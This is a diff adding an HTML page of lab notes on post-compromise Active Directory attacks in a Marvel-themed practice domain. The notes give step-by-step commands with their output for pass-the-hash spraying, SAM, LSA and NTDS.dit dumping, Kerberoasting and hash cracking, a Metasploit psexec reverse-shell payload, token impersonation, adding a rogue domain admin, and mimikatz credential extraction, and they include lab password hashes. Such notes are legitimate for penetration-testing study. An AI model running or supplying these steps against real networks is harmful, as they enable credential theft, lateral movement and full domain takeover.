@@ -1,0 +1,317 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Post Compromise Attacks</title>
+</head><body>Local login on Pwn3d! machines we got from crackmapexex<br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b --local-auth<br/>
+<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;[*] Windows 10.0 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;[*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.2 &nbsp; &nbsp;445 &nbsp; &nbsp;DESKTOP-3GD1MEH &nbsp;[*] Windows 10.0 Build 22621 x64 (name:DESKTOP-3GD1MEH) (domain:DESKTOP-3GD1MEH) (signing:False) (SMBv1:False)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.25 &nbsp; 445 &nbsp; &nbsp;HYDRA-DC2 &nbsp; &nbsp; &nbsp; &nbsp;[*] Windows 10.0 Build 20348 x64 (name:HYDRA-DC2) (domain:HYDRA-DC2) (signing:True) (SMBv1:False)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;[+] SPIDERMAN\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;[+] THEPUNISHER\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.2 &nbsp; &nbsp;445 &nbsp; &nbsp;DESKTOP-3GD1MEH &nbsp;[-] DESKTOP-3GD1MEH\administrator:64f12cddaa88057e06a81b54e73b949b STATUS_LOGON_FAILURE <br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.25 &nbsp; 445 &nbsp; &nbsp;HYDRA-DC2 &nbsp; &nbsp; &nbsp; &nbsp;[-] HYDRA-DC2\administrator:64f12cddaa88057e06a81b54e73b949b STATUS_LOGON_FAILURE <br/>
+<br/>
+we can only pas NTLMv1 hashes not NTLMv2<br/>
+<br/>
+We get login on PUNISHER and SPIDERMAN since local admin has same password in both, but in DC doamin ADMIN has different password which is P@$$word<br/>
+<br/>
+to dump SAM hashes of machines in which we do get successfl logins <br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b --local-auth --sam<br/>
+<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;[*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;[+] THEPUNISHER\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;[+] Dumping SAM hashes<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d0b242c83f473547e5dd3b675a709363:::<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;peterparker:1001:aad3b435b51404eeaad3b435b51404ee:ead0cc57ddaae50d876b7dd6386fa9c7:::<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;[+] Added 5 SAM hashes to the database<br/>
+<br/>
+<br/>
+everything is storeed in crackmapexec database<br/>
+<br/>
+to enumerate shares <br/>
+<br/>
+# crackmapexec smb 192.168.57.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b --local-auth --shares<br/>
+<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;[+] Enumerated shares<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;Share &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Permissions &nbsp; &nbsp; Remark<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;----- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----------- &nbsp; &nbsp; ------<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;ADMIN$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ,WRITE &nbsp; &nbsp; &nbsp;Remote Admin<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;C$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ,WRITE &nbsp; &nbsp; &nbsp;Default share<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.27 &nbsp; 445 &nbsp; &nbsp;SPIDERMAN &nbsp; &nbsp; &nbsp; &nbsp;IPC$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Remote IPC<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;[+] Enumerated shares<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;Share &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Permissions &nbsp; &nbsp; Remark<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;----- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----------- &nbsp; &nbsp; ------<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;ADMIN$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ,WRITE &nbsp; &nbsp; &nbsp;Remote Admin<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;C$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ,WRITE &nbsp; &nbsp; &nbsp;Default share<br/>
+SMB &nbsp; &nbsp; &nbsp; &nbsp; 192.168.57.26 &nbsp; 445 &nbsp; &nbsp;THEPUNISHER &nbsp; &nbsp; &nbsp;IPC$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Remote IPC<br/>
+<br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b --local-auth --lsa &nbsp; <br/>
+works same as secretsdump.py<br/>
+<br/>
+<br/>
+to list all the modules we use &nbsp;with a protocol <br/>
+#crackmapexec smb -L<br/>
+<br/>
+to use a module use -M<br/>
+<br/>
+# crackmapexec smb 192.168.57.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b --local-auth -M lsassy<br/>
+<br/>
+to open crackmapexec database<br/>
+<br/>
+#cmedb<br/>
+#help<br/>
+#hosts<br/>
+#cred<br/>
+<br/>
++Credentials---------+-----------+-------------+--------------------+-------------------------------------------------------------------+<br/>
+| CredID | Admin On &nbsp;| CredType &nbsp;| Domain &nbsp; &nbsp; &nbsp;| UserName &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | Password &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+<br/>
+| 1 &nbsp; &nbsp; &nbsp;| 2 Host(s) | plaintext | MARVEL &nbsp; &nbsp; &nbsp;| fcastle &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| P@ssword &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+| 2 &nbsp; &nbsp; &nbsp;| 1 Host(s) | hash &nbsp; &nbsp; &nbsp;| SPIDERMAN &nbsp; | administrator &nbsp; &nbsp; &nbsp;| 64f12cddaa88057e06a81b54e73b949b &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+| 3 &nbsp; &nbsp; &nbsp;| 1 Host(s) | hash &nbsp; &nbsp; &nbsp;| THEPUNISHER | administrator &nbsp; &nbsp; &nbsp;| 64f12cddaa88057e06a81b54e73b949b &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+| 4 &nbsp; &nbsp; &nbsp;| 0 Host(s) | hash &nbsp; &nbsp; &nbsp;| SPIDERMAN &nbsp; | Guest &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |<br/>
+| 5 &nbsp; &nbsp; &nbsp;| 0 Host(s) | hash &nbsp; &nbsp; &nbsp;| SPIDERMAN &nbsp; | DefaultAccount &nbsp; &nbsp; | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |<br/>
+| 6 &nbsp; &nbsp; &nbsp;| 0 Host(s) | hash &nbsp; &nbsp; &nbsp;| SPIDERMAN &nbsp; | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:d0b242c83f473547e5dd3b675a709363 |<br/>
+| 7 &nbsp; &nbsp; &nbsp;| 0 Host(s) | hash &nbsp; &nbsp; &nbsp;| SPIDERMAN &nbsp; | peterparker &nbsp; &nbsp; &nbsp; &nbsp;| aad3b435b51404eeaad3b435b51404ee:ead0cc57ddaae50d876b7dd6386fa9c7 |<br/>
++--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+<br/>
+<br/>
+<br/>
+Dumping and Cracking Hashes<br/>
+<br/>
+# sudo secretsdump.py MARVEL.local/fcastle:'P@ssword'@192.168.57.26 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f2a4999edb47062f7d23ba960a8b6a0f:::<br/>
+frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::<br/>
+[*] Dumping cached domain logon information (domain/username:hash)<br/>
+MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#2f3b735da3b754edec590b932f18dab7<br/>
+MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#276195cb933a1ff64ee48859a3e5a40c<br/>
+[*] Dumping LSA Secrets<br/>
+[*] $MACHINE.ACC <br/>
+MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:af9316da81c96943138fdbbe19d734319b89e9145a659b3a4144eeb257f3571f<br/>
+MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:b117bd6b5b4fa02e83e09b4190f688af<br/>
+MARVEL\THEPUNISHER$:des-cbc-md5:9e8a20757929b69d<br/>
+MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:b9237926475ab22d3bcff517cd977f6e:::<br/>
+<br/>
+since fcastle is admin of SPIDERMAN as well, can dump hashes from SPIDERMAN uses same credentials<br/>
+<br/>
+#sudo secretsdump.py MARVEL.local/fcastle:'P@ssword'@192.168.57.27<br/>
+<br/>
+can use secrets dump with Hash as well<br/>
+#sudo secretsdump.py administrator@192.168.57.26 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b<br/>
+<br/>
+llmnr -&gt; fcastle hash -&gt; sprayed the network -&gt; found new login -&gt; secretsdump those logins -&gt; local admin hashes -&gt; respray the network with local accounts<br/>
+<br/>
+1st password spray : smbrelay, found login on SPIDERMAN <br/>
+then secretsdump both SPIDERMAN and punisher to get local accounts<br/>
+2nd credentials spray using local accounts <br/>
+lateral movement until we find vertical movement<br/>
+<br/>
+to crack NTLMv1 passwords, only need the NT part<br/>
+<br/>
+#hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Kerberoasting<br/>
+<br/>
+This attack makes use of service accounts<br/>
+Goal is to get servers TGS and decrypt it<br/>
+SPN:Service Principle Name<br/>
+<br/>
+To access a application server(SQL service here) we need to request TGT(Ticket Granting Ticket) form KDC(Key Disribtion service) &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+1)Any user can request TGT from DC if they have valid credentials which we got<br/>
+2)Once we have TGT we can request a TGS(Service ticket) <br/>
+3)To get TGS, we have to present our TGT<br/>
+4)The TGS is encrypted with services accounts passwords hash<br/>
+DC is the KDC<br/>
+<br/>
+#sudo GetUserSPNs.py MARVEL.local/fcastle:'P@ssword' -dc-ip 192.168.57.25 -request<br/>
+point to to the KDC, which is DC here<br/>
+<br/>
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br/>
+This happens if time skew between client and KDC is greater than 5 minutes<br/>
+#sudo apt install ntpdate -y<br/>
+#sudo ntpdate dc-ip<br/>
+so<br/>
+#sudo ntpdate 192.168.57.25<br/>
+<br/>
+<br/>
+#sudo GetUserSPNs.py MARVEL.local/fcastle:'P@ssword' -dc-ip 192.168.57.25 -request<br/>
+<br/>
+$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC2/SQLService.MARVEL.local~60111*$86b3f42d6d0a763db98939ba7a75f04f$9f95bf0c04dcb69279ff08347770edcb694b2f831551efdb8c1b72d43739fe018e29960cbdabacec50254ddec6797f560e1fca30c6bea39b033ae82ae164a86535fa5db34993cd31d8240e1908e2a4ffeda746d196b117eecb22f722e49d9aa5e2402d475a74cd5e30eb98427183869fdaf9218708b1fa90a13143b34750ebcfa5a008b4cb77040813b2f0716fbb407416d3e58c09182cf677a96cc7d49351840f508a43bef9c77dacaa5d8480a6e796a33003682f6c6b7a343a32457bccbdeedfd08a95520d105fb1a82b55912fbd7ff787d64ed1625fb15444025247c2d76aef5102269517bcaae267b3c7c2493beb0b6b5e301b6d279a1974ab414de2eefdfe2a569a51bf3076363ff00ee336884836aa571e0b83fed43079b288bce1109a85922b229ddf7f3b41a014fa6d6ce76749295189a230f4093a4c97e79751d902204bd9fff0763baa3b797073f3bcd9ec385187b6c1f5d05354175515879dc4f4004ee61121bcbfb195836b5a0ae47da370e7d4eee26f335ec7fbe1c0b3fe45a7f8799129bda642144d6e1e863f4138d918dc7e54e0b12dff3ebc584320360ed76b1fe46092010463cccb759895e70451dabccde81b406921695c78c3409d2c432c49f9f1ab6a3872cd05275a976f4d86fbc2dd4c2110ad4796408b663ba450d6cc1665e3a6ef284c88f0360e44523262b22fb2df67dc7b2efd86ac4d10ced2b2b7c88ecf0024465d26a0509d30bda7d4a84104182d196f8c13d639aeddf773272e2d403c08031506c23dd3dcf81f2c8072f9e1cd7057a15e72ecbb27872f9ca9b72c6d25ebf36c50d58e5c1849105bedacbc7e8ee2b12443fda2b823d7e80bc9a3657dc08eb03aa7be1884a29a2200a8d147a4f5c23f72a45e45717783d7204c975c39baccebb498d874f7de6d52e9dc3992433b126098b5b2a7ff1efd1ecafd689e4464a6b0195e555e07c6fb8a0b29f76b3400f16ea9a987b7bbc327f31555835faecb99badbca2b6952e2db0a012c3eb45092161b05002df31dfa0a87af7d4055a9c37a7f17a45b8d82dc136c220dee9a256a2909898b6b16d9b92dfa1bcb640e33c9666113f82fb3c0b1720a5f1b3feee1570eb4bb11b5ee8e3b9d89bc3c9d5d8e597437b797a0c1d524eed857309bdad725a452ef19c4f44060e23928897c3a6873168913e42639862df6a22f888ebccaa96c60c2945c1378a0d95dcf33d8b7f2c315204360eff322b5e469c187dea4fa6ac71b54645a7217527a8ce78f4dd8acd862aefd2be9793b3534684d3841c850c3f4ca09cb9730ce445cf50e1a23af9278d45301485f9fe63cd37b43e92636d1d9bb5757fedb383e69a8359110f97c5186b204c644b32d4b3799287c80d08db05d1d6bfe61fa47f7e69a8d5bf7a3e4296136a0c07e545073e33ded860fe688427e0d011264b43bfac0<br/>
+<br/>
+<br/>
+#hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt<br/>
+<br/>
+$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC2/SQLService.MARVEL.local~60111*$86b3f42d6d0a763db98939ba7a75f04f$9f95bf0c04dcb69279ff08347770edcb694b2f831551efdb8c1b72d43739fe018e29960cbdabacec50254ddec6797f560e1fca30c6bea39b033ae82ae164a86535fa5db34993cd31d8240e1908e2a4ffeda746d196b117eecb22f722e49d9aa5e2402d475a74cd5e30eb98427183869fdaf9218708b1fa90a13143b34750ebcfa5a008b4cb77040813b2f0716fbb407416d3e58c09182cf677a96cc7d49351840f508a43bef9c77dacaa5d8480a6e796a33003682f6c6b7a343a32457bccbdeedfd08a95520d105fb1a82b55912fbd7ff787d64ed1625fb15444025247c2d76aef5102269517bcaae267b3c7c2493beb0b6b5e301b6d279a1974ab414de2eefdfe2a569a51bf3076363ff00ee336884836aa571e0b83fed43079b288bce1109a85922b229ddf7f3b41a014fa6d6ce76749295189a230f4093a4c97e79751d902204bd9fff0763baa3b797073f3bcd9ec385187b6c1f5d05354175515879dc4f4004ee61121bcbfb195836b5a0ae47da370e7d4eee26f335ec7fbe1c0b3fe45a7f8799129bda642144d6e1e863f4138d918dc7e54e0b12dff3ebc584320360ed76b1fe46092010463cccb759895e70451dabccde81b406921695c78c3409d2c432c49f9f1ab6a3872cd05275a976f4d86fbc2dd4c2110ad4796408b663ba450d6cc1665e3a6ef284c88f0360e44523262b22fb2df67dc7b2efd86ac4d10ced2b2b7c88ecf0024465d26a0509d30bda7d4a84104182d196f8c13d639aeddf773272e2d403c08031506c23dd3dcf81f2c8072f9e1cd7057a15e72ecbb27872f9ca9b72c6d25ebf36c50d58e5c1849105bedacbc7e8ee2b12443fda2b823d7e80bc9a3657dc08eb03aa7be1884a29a2200a8d147a4f5c23f72a45e45717783d7204c975c39baccebb498d874f7de6d52e9dc3992433b126098b5b2a7ff1efd1ecafd689e4464a6b0195e555e07c6fb8a0b29f76b3400f16ea9a987b7bbc327f31555835faecb99badbca2b6952e2db0a012c3eb45092161b05002df31dfa0a87af7d4055a9c37a7f17a45b8d82dc136c220dee9a256a2909898b6b16d9b92dfa1bcb640e33c9666113f82fb3c0b1720a5f1b3feee1570eb4bb11b5ee8e3b9d89bc3c9d5d8e597437b797a0c1d524eed857309bdad725a452ef19c4f44060e23928897c3a6873168913e42639862df6a22f888ebccaa96c60c2945c1378a0d95dcf33d8b7f2c315204360eff322b5e469c187dea4fa6ac71b54645a7217527a8ce78f4dd8acd862aefd2be9793b3534684d3841c850c3f4ca09cb9730ce445cf50e1a23af9278d45301485f9fe63cd37b43e92636d1d9bb5757fedb383e69a8359110f97c5186b204c644b32d4b3799287c80d08db05d1d6bfe61fa47f7e69a8d5bf7a3e4296136a0c07e545073e33ded860fe688427e0d011264b43bfac0:MYpassword123#<br/>
+<br/>
+this is the password for the service SQL<br/>
+<br/>
+Token Impersonation<br/>
+<br/>
+Tokens are like cookies for computer<br/>
+<br/>
+Temporary keys that allow access to a network/system without having to provide credentials each time we access a file<br/>
+<br/>
+Types of Tokens<br/>
+1)Delegate : Created when logging into a machine or using remote desktop<br/>
+2)Impersonate: 'non-interactive' such as attaching a network drive or logon script<br/>
+<br/>
+first get a shell using tools like psexec<br/>
+#msfconsole<br/>
+<br/>
+#search psexec<br/>
+#use 4(exploit/windows/smb/psexec)<br/>
+<br/>
+#set payload windows/x64/meterpreter/reverse_tcp<br/>
+#set rhost 192.168.57.26(PUNISHER)<br/>
+#set smbuser fcastle<br/>
+#set smbpass P@ssword<br/>
+#set smbdomain MARVEL.local<br/>
+#run<br/>
+#shell<br/>
+#whoami<br/>
+<br/>
+#Ctrl + C<br/>
+<br/>
+#load incognito<br/>
+#list_tokens -u<br/>
+-u : users<br/>
+-g: for groups<br/>
+Font Driver Host\UMFD-0<br/>
+Font Driver Host\UMFD-1<br/>
+MARVEL\fcastle<br/>
+NT AUTHORITY\LOCAL SERVICE<br/>
+NT AUTHORITY\NETWORK SERVICE<br/>
+NT AUTHORITY\SYSTEM<br/>
+Window Manager\DWM-1<br/>
+<br/>
+#impersonate_token marvel\\fcastle<br/>
+need 2 \ for 1 for character escaping<br/>
+<br/>
+[+] Delegation token available<br/>
+[+] Successfully impersonated user MARVEL\fcastle<br/>
+<br/>
+<br/>
+#shell<br/>
+#whoami<br/>
+marvel\fcastle<br/>
+<br/>
+to get back to original shell<br/>
+#rev2self<br/>
+#getuid<br/>
+Login in PUNISHER as marvel\administrator<br/>
+Once we are logged in as MARVEL\administrator, delegate token is created and we should be able to impersonate it<br/>
+<br/>
+#list_tokens -u<br/>
+Font Driver Host\UMFD-0<br/>
+Font Driver Host\UMFD-1<br/>
+Font Driver Host\UMFD-2<br/>
+MARVEL\Administrator<br/>
+MARVEL\fcastle<br/>
+NT AUTHORITY\LOCAL SERVICE<br/>
+NT AUTHORITY\NETWORK SERVICE<br/>
+NT AUTHORITY\SYSTEM<br/>
+Window Manager\DWM-1<br/>
+Window Manager\DWM-2<br/>
+<br/>
+#impersonate_token marvel\\administrator<br/>
+<br/>
+#shell<br/>
+#whoami<br/>
+marvel\administrator<br/>
+as POC, add a new user<br/>
+#net user /add hawkeye Password1@ /domain<br/>
+#net group "Domain Admins" hawkeye /add /domain <br/>
+now secretsdump from hawkeye<br/>
+#sudo secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.57.25<br/>
+point it at domain controller<br/>
+only domain admin can do this<br/>
+<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e4dbf83aa056289935daea328977b20:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:da228cb26a1ae227475f4730406a8d21:::<br/>
+MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::<br/>
+MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::<br/>
+MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::<br/>
+MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:ead0cc57ddaae50d876b7dd6386fa9c7:::<br/>
+hawkeye:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::<br/>
+HYDRA-DC2$:1000:aad3b435b51404eeaad3b435b51404ee:608f38166d2c6ff182d79159b177afe8:::<br/>
+THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:b9237926475ab22d3bcff517cd977f6e:::<br/>
+SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:8b2d1b39126b6aa5f13fcaa67ca34ac5:::<br/>
+<br/>
+Token available even user does Switch user instead of signing out<br/>
+<br/>
+<br/>
+Mimikatz (Gets picked up by antivirus easily)<br/>
+<br/>
+github :https://github.com/gentilkiwi/mimikatz<br/>
+<br/>
+copy those 4 files in SPIDERMAN using http server on attacker<br/>
+run cmd as admin<br/>
+<br/>
+#mimikatz.exe <br/>
+#privilege::debug<br/>
+#sekurlsa::<br/>
+#sekurlsa::logonPasswords<br/>
+<br/>
+Dumping NTDS.dit<br/>
+<br/>
+#sudo secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.57.25 -just-dc-ntlm<br/>
+point it to domain controller<br/>
+<br/>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br/>
+[*] Using the DRSUAPI method to get NTDS.DIT secrets<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2e4dbf83aa056289935daea328977b20:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:da228cb26a1ae227475f4730406a8d21:::<br/>
+MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::<br/>
+MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::<br/>
+MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::<br/>
+MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:ead0cc57ddaae50d876b7dd6386fa9c7:::<br/>
+hawkeye:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::<br/>
+HYDRA-DC2$:1000:aad3b435b51404eeaad3b435b51404ee:608f38166d2c6ff182d79159b177afe8:::<br/>
+THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:b9237926475ab22d3bcff517cd977f6e:::<br/>
